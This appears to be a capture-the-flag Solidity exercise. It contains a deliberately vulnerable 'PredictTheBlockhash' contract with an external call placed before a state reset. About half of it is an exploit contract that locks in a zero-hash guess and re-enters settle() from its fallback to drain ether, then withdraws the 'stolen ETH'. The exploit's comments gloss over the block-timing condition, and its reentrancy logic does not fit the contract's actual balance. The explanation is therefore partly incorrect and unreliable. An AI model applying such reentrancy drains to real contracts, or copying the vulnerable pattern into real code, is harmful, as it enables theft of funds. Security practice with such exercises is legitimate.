// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

//Challenge
contract PredictTheBlockhash {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(
            msg.value == 1 ether,
            "Requires 1 ether to create this contract"
        );
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == address(0), "Requires guesser to be zero address");
        require(msg.value == 1 ether, "Requires msg.value to be 1 ether");

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser, "Requires msg.sender to be guesser");
        require(
            block.number > settlementBlockNumber,
            "Requires block.number to be more than settlementBlockNumber"
        );

        bytes32 answer = blockhash(settlementBlockNumber);

        // VULNERABILITY: External call before state update
        if (guess == answer) {
            (bool ok, ) = msg.sender.call{value: 2 ether}("");
            require(ok, "Transfer to msg.sender failed");
        }
        
        // State update happens AFTER external call (vulnerable to reentrancy)
        guesser = address(0);
    }
}

// Write your exploit contract below
contract ExploitContract {
    PredictTheBlockhash public predictTheBlockhash;
    bool private attacking;
    uint256 private attackCount;
    uint256 private maxAttacks = 5; // Limit to prevent infinite loop

    constructor(PredictTheBlockhash _predictTheBlockhash) payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        predictTheBlockhash = _predictTheBlockhash;
    }

    // Function to initiate the attack
    function attack() external {
        require(!attacking, "Attack already in progress");
        
        // Lock in a guess (we'll use a predictable hash)
        bytes32 predictableHash = bytes32(0); // We'll predict this
        predictTheBlockhash.lockInGuess{value: 1 ether}(predictableHash);
        
        // Wait for the next block and then settle
        // Note: In a real scenario, you'd need to wait for the next block
        // For this exploit, we assume the block has passed
    }

    // Function to settle the guess and trigger reentrancy
    function settle() external {
        require(!attacking, "Attack already in progress");
        attacking = true;
        attackCount = 0;
        
        // Call settle which will trigger our fallback function
        predictTheBlockhash.settle();
        
        attacking = false;
    }

    // Fallback function that gets called when ETH is transferred to this contract
    // This is where the reentrancy attack happens
    fallback() external payable {
        if (attacking && attackCount < maxAttacks) {
            attackCount++;
            
            // Check if we can still call settle (guesser hasn't been reset yet)
            try predictTheBlockhash.settle() {
                // If successful, this will trigger another fallback call
            } catch {
                // If it fails, we stop the attack
            }
        }
    }

    // Receive function for plain ETH transfers
    receive() external payable {
        // Same logic as fallback
        if (attacking && attackCount < maxAttacks) {
            attackCount++;
            
            try predictTheBlockhash.settle() {
                // Continue the attack
            } catch {
                // Stop if it fails
            }
        }
    }

    // Function to withdraw stolen ETH
    function withdraw() external {
        uint256 balance = address(this).balance;
        require(balance > 0, "No ETH to withdraw");
        
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
    }

    // Function to get contract balance
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
